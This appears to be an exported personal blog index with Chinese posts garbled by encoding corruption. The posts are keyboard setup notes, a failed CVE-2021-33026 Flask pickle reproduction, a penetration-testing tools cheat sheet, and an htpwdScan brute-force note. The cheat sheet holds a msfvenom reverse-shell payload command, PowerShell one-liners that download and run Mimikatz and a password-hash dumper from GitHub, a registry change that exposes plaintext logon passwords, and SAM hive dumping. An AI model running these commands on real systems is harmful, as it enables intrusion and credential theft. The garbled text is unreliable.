]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>äº¬ä¸œk2é”®ç›˜linuxä¸‹ä½¿ç”¨f1-12é”®</title>
    <url>/2022/02/20/%E4%BA%AC%E4%B8%9Ck2%E9%94%AE%E7%9B%98linux%E4%B8%8B%E4%BD%BF%E7%94%A8f1-12%E9%94%AE/</url>
    <content><![CDATA[<p>äº¬ä¸œk2é”®ç›˜linuxä¸‹ä½¿ç”¨f1-12é”®</p>
<span id="more"></span>

<p>é€‚é…Linux</p>
<p>å¦‚ä¸Šæ–‡æ‰€è¯´ï¼Œåœ¨Linuxä¸‹ä½¿ç”¨æ—¶ç”±äºå¾ˆå¤šåŠŸèƒ½å¹¶ä¸æ”¯æŒï¼Œå¹¶ä¸”F1~F12åœ¨Linuxä¸‹ä½œç”¨å¾ˆå¤§ï¼Œå”¯ä¸€çš„é—®é¢˜å°±æ˜¯è®¾ç½®ä»–ä»¬é»˜è®¤æŒ‰é”®ä¼˜å…ˆã€‚æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<pre><code>é€šè¿‡ä¾§è¾¹çš„è½¬æ¢ä»¶åˆ‡æ¢åˆ°Windowsæ¨¡å¼ä¸‹
åœ¨Windowsä¸‹é•¿æŒ‰Fn+X+L4ç§’ï¼Œç›´åˆ°é”®ç›˜ç¯é—ªçƒï¼Œä½¿å¾—é”®ç›˜åˆ‡æ¢åˆ°F1~F12çš„é»˜è®¤æŒ‰é”®ä¼˜å…ˆ
åœ¨Linuxå‘½ä»¤æç¤ºçª—ä¸‹è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼šecho 0 | sudo tee /sys/module/hid_apple/parameters/fnmode
</code></pre>
<p>è‡³æ­¤ï¼Œå¤§å®¶å°±å¯ä»¥åœ¨Linuxä¸‹ç¾ç¾çš„ä½¿ç”¨å¿ƒçˆ±çš„äº¬ä¸œäº¬é€ ç³»åˆ—é”®ç›˜äº†ã€‚<br>æ°¸ä¹…ç”Ÿæ•ˆ</p>
<p>ä»¥ä¸Šæ–¹æ³•åªæ˜¯è¾“å…¥å‘½ä»¤åç”Ÿæ•ˆï¼Œæƒ³è¦æ°¸ä¹…ç”Ÿæ•ˆï¼Œå¯ä»¥è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p>
<pre><code>åˆ›å»º/etc/modprobe.d/hid_apple.confæ–‡ä»¶
åœ¨æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹ä¸€è¡Œå†…å®¹å¹¶ä¿å­˜ï¼šoptions hid_apple fnmode=0
æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼šsudo update-initramfs -u
é‡å¯
</code></pre>
<h2 id="è½¬è½½çš„ï¼ŒåŸæ–‡é“¾æ¥"><a href="#è½¬è½½çš„ï¼ŒåŸæ–‡é“¾æ¥" class="headerlink" title="è½¬è½½çš„ï¼ŒåŸæ–‡é“¾æ¥"></a>è½¬è½½çš„ï¼ŒåŸæ–‡é“¾æ¥</h2><p><a href="https://blog.csdn.net/u013832707/article/details/119107571">https://blog.csdn.net/u013832707/article/details/119107571</a></p>
<p><a href="https://mikeshade.com/posts/keychron-linux-function-keys/">https://mikeshade.com/posts/keychron-linux-function-keys/</a></p>
]]></content>
      <tags>
        <tag>æ‚</tag>
      </tags>
  </entry>
  <entry>
    <title>å…³äºåšå®¢</title>
    <url>/2021/11/06/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>æŠŠä¹‹å‰çš„ä¸€äº›åœ¨æœ¬åœ°çš„mdæ–‡æ¡£ç¬”è®°ä¹Ÿéƒ½æ”¾äº†ä¸Šæ¥ï¼Œæœç´¢åŠŸèƒ½æŒºå¥½ç”¨ï¼Œç»è¿‡å‡ å¤©çš„æŠ˜è…¾ä¸€æ•´ä¸ªåšå®¢ä¹ŸåŸºæœ¬ä¸Šæˆå½¢äº†ï¼Œæ•´æŒºå¥½</p>
<p>è¿™ä¸ªæœˆäº‰å–æŠŠè®ºæ–‡æ•´å®ŒæŠŠï¼Œè¿˜æŒºå¿™çš„ï¼Œç°åœ¨ç®—æ˜¯å¼€é¢˜åˆšåˆšç»“æŸï¼Œä¸è¿‡è¿˜ç®—å……å®ï¼å¸Œæœ›æœˆåº•å­¦æ ¡èƒ½æ”¾å‡ºå»å®ä¹ ï¼Œä¸ç„¶å°±éº»çƒ¦äº†ï¼</p>
<p>ç°é˜¶æ®µè¿˜æ˜¯ç¨å®‰å‹¿èºå…ˆæŠŠè®ºæ–‡æŠ˜è…¾å®Œï¼Œç„¶åæœ‰ç©ºå¤šå­¦ç‚¹ä¸œè¥¿</p>
]]></content>
      <categories>
        <category>æ‚è°ˆ</category>
      </categories>
  </entry>
  <entry>
    <title>å¤ç°cve-2021-33026</title>
    <url>/2021/11/12/%E5%A4%8D%E7%8E%B0cve-2021-33026/</url>
    <content><![CDATA[<h1 id="cve-2021-33026å¤ç°"><a href="#cve-2021-33026å¤ç°" class="headerlink" title="cve-2021-33026å¤ç°"></a>cve-2021-33026å¤ç°</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33026">cve-2021-3302</a></p>
<p><a href="https://github.com/CarlosG13/CVE-2021-33026">pocåœ°å€</a></p>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ä¸ªäº”å…­æœˆä»½çš„æ¼æ´å‰å‡ å¤©çœ‹åˆ°äº†æœ‰pocå…¬å¼€äº†ï¼Œçœ‹äº†ä¸‹æ˜¯flask + pickle + flask-cachingçš„æ´ï¼Œå°±æƒ³ç€èƒ½ä¸èƒ½å¤ç°ä¸€ä¸‹</p>
<span id="more"></span>

<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>ç¯å¢ƒåŸºæœ¬ä¸Šæ²¡ä»€ä¹ˆé—®é¢˜,å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒç„¶åpipæ”¹è£…çš„åŒ…è£…è£…å…¨ï¼Œpythonéœ€è¦&gt;=3.5è¿™æ˜¯flask-cachingçš„è¦æ±‚</p>
<p>ç„¶åè¿™ä¸ªpocæ˜¯å¯¹memcacheçš„ï¼Œæ‰€ä»¥è£…ä¸€ä¸ª</p>
<h3 id="flaskä»£ç "><a href="#flaskä»£ç " class="headerlink" title="flaskä»£ç "></a>flaskä»£ç </h3><p>è¿™æ˜¯æˆ‘æ ¹æ®å®ƒpocé‡Œé¢æè¿°æ¥å†™çš„ï¼Œ</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636698378634-2021-11-1214:26:18.png"></p>
<p>æç¤ºmemcacheé‡Œé¢å­˜å‚¨çš„å¿…é¡»æ˜¯ä¼šè¯cookieç„¶åçœ‹å®ƒçš„æˆªå›¾æˆ‘å°±ç»™æ¯æ­¤è¯·æ±‚åˆ†é…äº†ä¸€ä¸ªuuid</p>
<p>ç„¶åæŒ‰ç…§æˆ‘çš„ç†è§£ï¼Œä»–çš„poc</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636698731944-2021-11-1214:32:11.png"></p>
<p>ç„¶åä¸ºäº†æ»¡è¶³ä»–çš„session:uuidçš„å½¢å¼æˆ‘åœ¨å‡½æ•°é‡Œå®ç°ç±»ä¸‹ï¼Œå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">from</span> flask.json <span class="keyword">import</span> jsonify</span><br><span class="line"><span class="keyword">from</span> flask_caching <span class="keyword">import</span> Cache</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> memcache</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">some_data = [<span class="string">&#x27;some&#x27;</span>, <span class="string">&#x27;data&#x27;</span>]</span><br><span class="line"></span><br><span class="line">mc = memcache.Client([<span class="string">&#x27;127.0.0.1:11211&#x27;</span>], debug=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cache = Cache()</span><br><span class="line">flask_app = Flask(__name__)</span><br><span class="line">flask_app.secret_key = <span class="string">b&#x27;xxxxx&#x27;</span></span><br><span class="line"></span><br><span class="line">cache.init_app(flask_app, &#123;<span class="string">&quot;CACHE_TYPE&quot;</span>: <span class="string">&quot;memcached&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@flask_app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cve_2021_33026</span>():</span></span><br><span class="line">    <span class="comment">#æ²¡å¤ç°æˆåŠŸçš„å…³é”®åº”è¯¥åœ¨è¿™ï¼ŒæŒ‰ç…§pocçš„æ„æ€æ˜¯è¦å°†cookiesååºåˆ—åŒ–ï¼Ÿ</span></span><br><span class="line">    <span class="comment">#cookie = str(uuid.uuid4())</span></span><br><span class="line">    <span class="comment">#resp = Response(&quot;set-Cookie&quot;)</span></span><br><span class="line">    <span class="comment">#resp.set_cookie(&#x27;session&#x27;, cookie)</span></span><br><span class="line">    <span class="comment">#stote = pickle.dumps(cookie)</span></span><br><span class="line">    <span class="comment">#mem_key = &#x27;session:&#x27; + cookie</span></span><br><span class="line">    <span class="comment">#mc.set(mem_key, stote)</span></span><br><span class="line">    <span class="comment">#pickle.loads(mc.get(mem_key))</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flask_app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5006</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>ç„¶åå°è¯•äº†ä¸€ä¸‹æ˜¯å¦å¯ä»¥é€šè¿‡è„šæœ¬â€¦</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636701025254-2021-11-1215:10:25.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636698027881-2021-11-1214:20:27.png"></p>
<p>æç¤ºsuccessä½†æ˜¯</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636699387808-2021-11-1214:43:07.png"></p>
<p>ä¹Ÿå°±æ˜¯è¯´cmdä¸­çš„å‘½ä»¤å®Œå…¨æ²¡æœ‰æ‰§è¡Œâ€¦</p>
<p>åªæ˜¯åˆå‘äº†ä¸€è¾¹è¯·æ±‚è€Œä¸æ˜¯æŒ‡å®šçš„å‘½ä»¤â€¦</p>
<p>åº”è¯¥æ˜¯æˆ‘çš„å‡½æ•°å†™çš„æœ‰ç‚¹é—®é¢˜â€¦</p>
<p>å†ç¢ç£¨ç¢ç£¨</p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¸—é€æµ‹è¯•å·¥å…·æ•´ç†</title>
    <url>/2021/11/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="metaspolit"><a href="#metaspolit" class="headerlink" title="metaspolit"></a>metaspolit</h2><p>é»˜è®¤ä½¿ç”¨<code>msfconsole</code>è¿›å…¥è¿™ä¸ªäº¤äº’å¼å‘½ä»¤è¡Œå·¥å…·ï¼Œ</p>
<p>ç„¶åä¸»è¦æ˜¯æœ‰å‡ ç§æ¨¡å¼</p>
<ol>
<li><p>ç›´æ¥åˆ©ç”¨payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æœç´¢æ¼æ´payload</span><br><span class="line">msf6 &gt; search [key_word]</span><br><span class="line"># é€‰ä¸­payload</span><br><span class="line">msf6 &gt; use [ä¸Šä¸€æ­¥æœå‡ºæ¥çš„payload name]</span><br><span class="line"># è®¾ç½®payloadå‚æ•°,keyå¿½ç•¥å¤§å°å†™</span><br><span class="line">msf6 &gt; set key value</span><br><span class="line">#ã€€æ˜¾ç¤ºpayloadå‚æ•°</span><br><span class="line">msf6 &gt; options</span><br><span class="line"># è¿è¡Œpayload</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„è¿™ä¸ªä¾æ—§æ˜¯msfconsoleæ¨¡å¼å°±æ˜¯äº¤äº’å¼å‘½ä»¤è¡Œæ¨¡å¼</p>
</li>
<li><p>åˆ©ç”¨æŒ‡å®šçš„payloadç›‘å¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt;ã€€use exploit/multi/handler        # åŠ è½½æ¨¡å—</span><br><span class="line">msf6 &gt; set [payload_name]   # è®¾ç½®åå­—</span><br><span class="line">msf6 &gt; set [options_key]  [options_value]   # è®¾ç½®è¯¥payloadçš„optionsé”®å€¼</span><br><span class="line"># å¼€å§‹ç›‘å¬</span><br><span class="line">msf6 &gt; run</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>ä¸Šé¢ä¸¤ä¸ªå¦‚æœrunå®Œæˆäº†ä¹‹åæ‰§è¡Œ<code>shell</code>å‘½ä»¤å°±è¿›å…¥äº†meterperterå³å·²ç»è¿›å…¥äº†ç³»ç»Ÿå†…éƒ¨shellç¯å¢ƒï¼Œæ‰€ä»¥ä¸ªäººç†è§£è¿™ä¸ªmeterperteræ˜¯å‡†å¤‡æŒä¹…åŒ–</strong></p>
<ol start="3">
<li><p>ä½¿ç”¨msfç”Ÿæˆåé—¨</p>
<p>è¿™æ˜¯å¦ä¸€ä¸ªæ¨¡å—<strong>msfvenom</strong>çš„å†…å®¹</p>
<p>example:</p>
<ul>
<li>ç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶</li>
</ul>
</li>
</ol>
<p>â€‹        <code>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.100.103 LPORT=4444 -f raw &gt; beacon.bin</code></p>
<ul>
<li>ç”Ÿæˆå…¶ä»–ç±»å‹åªéœ€è¦æ”¹-fçš„å±æ€§å°±è¡Œ</li>
</ul>
<h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a><a href="https://github.com/wpscanteam/wpscan">wpscan</a></h2><blockquote>
<p>æ­¤å·¥å…·ä¸»è¦ç”¨æ¥æ‰«æworldpressè¿™ä¸ªåšå®¢æ¡†æ¶ï¼Œè¿™ä¸ªåº”è¯¥æ›´åŠ é è¿‘webæ¸—é€é‚£ä¸€ä¾§ï¼Œå°±å…ˆæ”¾åœ¨è¿™é‡Œåšå·¥å…·æ•´ç†</p>
<p>world press scan</p>
</blockquote>
<p>å®ƒä½¿ç”¨Rçš„åŒ…ç®¡ç†æ„å»ºï¼Œæˆ–è€…ä½¿ç”¨dockerï¼Œkaliè‡ªå¸¦ã€‚</p>
<p>æˆ‘çš„ç³»ç»Ÿæ˜¯ubuntuæ‰€ä»¥é‡‡ç”¨äº†å‰è€…æ„å»ºï¼Œè¯¦è§ä¹‹å‰æ‰“è¿™ä¸ªé¶åœºçš„æ—¶å€™<a href="https://lycshub.github.io/2021/11/23/vulnhub-DC-2/">è®°å½•</a></p>
<p>å‚æ•°å’Œç”¨æ³•å¾ˆç®€å•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ï¼ƒä½¿ç”¨é»˜è®¤é…ç½®æ‰«ç½‘ç«™</span><br><span class="line">wpscan --urlã€€[ç›®æ ‡ç½‘ç«™]</span><br><span class="line"># ä½¿ç”¨--stealthyå¯ä»¥é™é»˜æ‰«æé˜²æ­¢ç½‘ç«™å‘ç°</span><br><span class="line">--enumertateå¯ä»¥çˆ†ç ´ç”¨æˆ·åä½¿ç”¨å®ƒçš„æ—¶å€™åŠ ä¸Š--plugins-detectionæ£€æµ‹æ’ä»¶é€‰é¡¹ï¼Œé»˜è®¤æ˜¯ä¸æ£€æŸ¥</span><br><span class="line">-u æ˜¯æšä¸¾ç”¨æˆ·å</span><br></pre></td></tr></table></figure>



<h2 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h2><p>è¿™æ˜¯ä¸€ä¸ªå­—å…¸ç”Ÿæˆå™¨<code>-h</code>å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„é€‰é¡¹</p>
<p>è®°å½•ä¸‹å¸¸ç”¨é€‰é¡¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#é»˜è®¤æ–¹æ³•ç›´æ¥å§ç”Ÿæˆçš„å­—å…¸</span><br><span class="line">cewl url</span><br><span class="line"># -wç”Ÿæˆåˆ°æŒ‡å®šæ–‡ä»¶</span><br><span class="line">cewl url -w dict.txt</span><br><span class="line"># è®¡ç®—é‡å¤çš„å•è¯æ¬¡æ•°</span><br><span class="line">cewl url -c</span><br><span class="line"># -d çˆ¬å–æ·±åº¦3å±‚</span><br><span class="line">cewl url -d 3</span><br><span class="line"># -eè·å–emailä¿¡æ¯</span><br><span class="line"># --with-numbersåŒ…æ‹¬æ•°å­—å’Œå­—ç¬¦</span><br></pre></td></tr></table></figure>



<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></h2><blockquote>
<p>è¿™ä¸ªå·¥å…·æ˜¯æˆ‘æ–°æ¥è§¦çš„ï¼Œè®°å½•ä¸€ä¸‹ä½¿ç”¨çš„å§¿åŠ¿</p>
<p>ä¸»è¦å°±æ˜¯ä¸€ä¸ªåæ¸—é€çš„å·¥å…·ï¼Œé’ˆå¯¹æ‹¿åˆ°äº†shellä½†æ˜¯æ²¡æœ‰æ›´é«˜çš„æƒé™æ—¶</p>
<p>é’ˆå¯¹windowsç³»ç»Ÿ</p>
<p>Mimikatz æ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„è½»é‡çº§è°ƒè¯•ç¥å™¨ï¼Œé€šè¿‡å®ƒä½ å¯ä»¥æå‡è¿›ç¨‹æƒé™æ³¨å…¥è¿›ç¨‹è¯»å–è¿›ç¨‹å†…å­˜ï¼Œå½“ç„¶ä»–æœ€å¤§çš„äº®ç‚¹å°±æ˜¯ä»–å¯ä»¥ç›´æ¥ä»  lsass.exe è¿›ç¨‹ä¸­è·å–å½“å‰ç™»å½•ç³»ç»Ÿç”¨æˆ·åçš„å¯†ç ï¼Œ  lsassæ˜¯å¾®è½¯Windowsç³»ç»Ÿçš„å®‰å…¨æœºåˆ¶å®ƒä¸»è¦ç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»é™†ç­–ç•¥ï¼Œé€šå¸¸æˆ‘ä»¬åœ¨ç™»é™†ç³»ç»Ÿæ—¶è¾“å…¥å¯†ç ä¹‹åï¼Œå¯†ç ä¾¿ä¼šå‚¨å­˜åœ¨  lsasså†…å­˜ä¸­ï¼Œç»è¿‡å…¶ wdigest å’Œ tspkg ä¸¤ä¸ªæ¨¡å—è°ƒç”¨åï¼Œå¯¹å…¶ä½¿ç”¨å¯é€†çš„ç®—æ³•è¿›è¡ŒåŠ å¯†å¹¶å­˜å‚¨åœ¨å†…å­˜ä¹‹ä¸­ï¼Œ è€Œ mimikatz  æ­£æ˜¯é€šè¿‡å¯¹lsassé€†ç®—è·å–åˆ°æ˜æ–‡å¯†ç ï¼ä¹Ÿå°±æ˜¯è¯´åªè¦ä½ ä¸é‡å¯ç”µè„‘ï¼Œå°±å¯ä»¥é€šè¿‡ä»–è·å–åˆ°ç™»é™†å¯†ç ï¼Œåªé™å½“å‰ç™»é™†ç³»ç»Ÿï¼</p>
<p>æ³¨ï¼šä½†æ˜¯åœ¨å®‰è£…äº†KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwindows server  2012æ—¶ï¼Œç³»ç»Ÿçš„å†…å­˜ä¸­å°±ä¸å†ä¿å­˜æ˜æ–‡çš„å¯†ç ï¼Œè¿™æ ·åˆ©ç”¨mimikatzå°±ä¸èƒ½ä»å†…å­˜ä¸­è¯»å‡ºæ˜æ–‡å¯†ç äº†ã€‚mimikatzçš„ä½¿ç”¨éœ€è¦administratorç”¨æˆ·æ‰§è¡Œï¼Œadministratorsä¸­çš„å…¶ä»–ç”¨æˆ·éƒ½ä¸è¡Œã€‚</p>
</blockquote>
<h3 id="ä½¿ç”¨powershellè·å–å¯†ç "><a href="#ä½¿ç”¨powershellè·å–å¯†ç " class="headerlink" title="ä½¿ç”¨powershellè·å–å¯†ç "></a>ä½¿ç”¨powershellè·å–å¯†ç </h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è¯»å–å¯†ç æ˜æ–‡(éœ€è¦ç®¡ç†å‘˜æƒé™)</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;</span>); <span class="built_in">Invoke-Mimikatz</span> â€“DumpCerts</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è¯»å–å¯†ç hashå€¼(éœ€è¦ç®¡ç†å‘˜æƒé™)</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#x27;</span>);<span class="built_in">Get-PassHashes</span></span><br></pre></td></tr></table></figure>



<h4 id="æœ¬åœ°æ‰§è¡Œ"><a href="#æœ¬åœ°æ‰§è¡Œ" class="headerlink" title="æœ¬åœ°æ‰§è¡Œ"></a>æœ¬åœ°æ‰§è¡Œ</h4><p>ä¸‹è½½mimikatzç¨‹åºï¼Œæ‰¾åˆ°è‡ªå·±ç³»ç»Ÿå¯¹åº”çš„ä½æ•°ï¼Œå³é”®ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æå‡æƒé™</span></span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line"><span class="comment">#æŠ“å–å¯†ç </span></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>å½“ç›®æ ‡ä¸ºwin10æˆ–2012R2ä»¥ä¸Šæ—¶ï¼Œé»˜è®¤åœ¨å†…å­˜ç¼“å­˜ä¸­ç¦æ­¢ä¿å­˜æ˜æ–‡å¯†ç ï¼Œä½†å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼æŠ“å–æ˜æ–‡ã€‚</p>
<p>cmdä¿®æ”¹æ³¨å†Œè¡¨å‘½ä»¤ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Copyreg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line"><span class="comment">#é‡å¯æˆ–ç”¨æˆ·é‡æ–°ç™»å½•åå¯ä»¥æˆåŠŸæŠ“å–</span></span><br></pre></td></tr></table></figure>

<h4 id="SAMè¡¨è·å–hash"><a href="#SAMè¡¨è·å–hash" class="headerlink" title="SAMè¡¨è·å–hash"></a>SAMè¡¨è·å–hash</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å¯¼å‡ºSAMæ•°æ®</span></span><br><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä½¿ç”¨mimikatzæå–hash</span></span><br><span class="line">lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure>



<p>è¿˜æœ‰å’Œå¾ˆå¤šå§¿åŠ¿ï¼Œå› ä¸ºå¯¹windowså¾ˆå¤šå®‰å…¨æœºåˆ¶ä¸äº†è§£ï¼ˆæ¯”å¦‚åŸŸæ§ä¸­çš„æˆå‘˜hash,å“ˆç³»ä¼ é€’æ”»å‡»ï¼Œç¥¨æ®ä¼ é€’æ”»å‡»åŒ…æ‹¬è¿™ä¸ªå·¥å…·æœ¬èº«çš„å…æ€ï¼‰å…ˆæŒ–ä¸ªå‘ï¼Œä¹‹åè¡¥å…¨</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.cnblogs.com/-mo-/p/11890232.html">https://www.cnblogs.com/-mo-/p/11890232.html</a></p>
<p><a href="https://www.freebuf.com/articles/network/190128.html">https://www.freebuf.com/articles/network/190128.html</a></p>
]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>çˆ†ç ´åå°-htpwdScan</title>
    <url>/2021/11/17/%E7%88%86%E7%A0%B4%E5%90%8E%E5%8F%B0-htpwdScan/</url>
    <content><![CDATA[<h2 id="htpwdScan"><a href="#htpwdScan" class="headerlink" title="htpwdScan"></a><a href="https://github.com/lijiejie/htpwdScan">htpwdScan</a></h2><p>è¿™ä¸ªå·¥å…·æœ‰ä¸€ç‚¹å°å‘ï¼Œè®°å½•ä¸€ä¸‹å¤‡å¿˜</p>
<span id="more"></span>

<p>ä¼˜åŠ¿åœ¨äºå¯ä»¥æ–¹ä¾¿çš„ä½¿ç”¨å¯¹å‚æ•°åšäºŒæ¬¡å¤„ç†ï¼Œå¯ä»¥è‡ªå·±ç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥è¿›è¡Œæ’å…¥æ“ä½œ</p>
<p>ç»è¿‡æµ‹è¯•å‘ç°è¿™ä¸ªhashpasswordå‚æ•°åªæ˜¯ä¸€ä¸ªbase64ç¼–ç åçš„å­—ç¬¦ä¸²</p>
<p>åˆ©ç”¨è¿™ä¸ªè„šæœ¬æ¥å®Œæˆ</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/image-20211117114656854-2021-11-1712:07:27.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637121965955-2021-11-1712:06:05.png"></p>
<p>ç„¶åæŒ‰ç…§ä»–çš„è·¯å¾„ä¿®æ”¹ä¸€ä¸‹æŠŠå¯†ç å­—å…¸ä¼ å…¥çš„å­—ç¬¦ä¸²å…ˆåšä¸€ä¸ªbase64ç¼–ç </p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637122132952-2021-11-1712:08:52.png"></p>
<p>ä½†æ˜¯ä½¿ç”¨å‘½ä»¤è¡Œçš„æ—¶å€™ç›´æ¥æŠ¥é”™ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ï¼Œæœ€åçš„è§£å†³æ–¹æ¡ˆæ˜¯ç›´æ¥æ‰¾åˆ°ä»–çš„è¿è¡Œç±»ï¼Œæ¨¡æ‹Ÿå‘½ä»¤è¡Œå‚æ•°è¾“å…¥çš„æ–¹å¼è¿›è¡Œè¿è¡Œ</p>
<p>ç›´æ¥è¿è¡Œè¿™ä¸ªpyå°±å¯ä»¥ï¼Œå¡«å…¥è‡ªå·±éœ€è¦çš„å‚æ•°</p>
<p><code>request.txt</code>æ˜¯burpæŠ“ä¸‹æ¥çš„è¯·æ±‚ä½“</p>
<p>-d æ˜¯å­—å…¸ï¼Œç„¶ååé¢æ˜¯å‚æ•°ï¼å­—å…¸</p>
<p>â€“failæ˜¯å“åº”ä½“å‡ºç°çš„å†…å®¹è¡¨ç¤ºé”™è¯¯</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637122264381-2021-11-1712:11:04.png"></p>
<p>å®˜ç½‘è¯¦ç»†çš„å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usage: htpwdScan.py [options]</span><br><span class="line"></span><br><span class="line">* HTTP weak pass scanner. By LiJieJie *</span><br><span class="line"></span><br><span class="line">Target:</span><br><span class="line">  -u RequestURL         æŒ‡å®šç ´è§£çš„URL</span><br><span class="line">                        -u &quot;https://www.test.com/login.php&quot;</span><br><span class="line">  -f RequestFile        ä»æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œå¯¼å…¥HTTPè¯·æ±‚</span><br><span class="line">  --https               å½“ä»æ–‡ä»¶å¯¼å…¥HTTPè¯·æ±‚æ—¶ï¼Œå¼ºåˆ¶ä½¿ç”¨HTTPS</span><br><span class="line">  --get                 å¼ºåˆ¶ä½¿ç”¨HTTP GETï¼Œé»˜è®¤POST</span><br><span class="line">  --auth  [ ...]        Basic/Digest/NTLM æš´åŠ›ç ´è§£,</span><br><span class="line">                        e.g. --auth users.txt pass.txt</span><br><span class="line">                        e.g. --auth users.txt my_own_func(pass.txt)</span><br><span class="line">  --pass-first          å›ºå®šå¯†ç ä¼˜å…ˆçˆ†ç 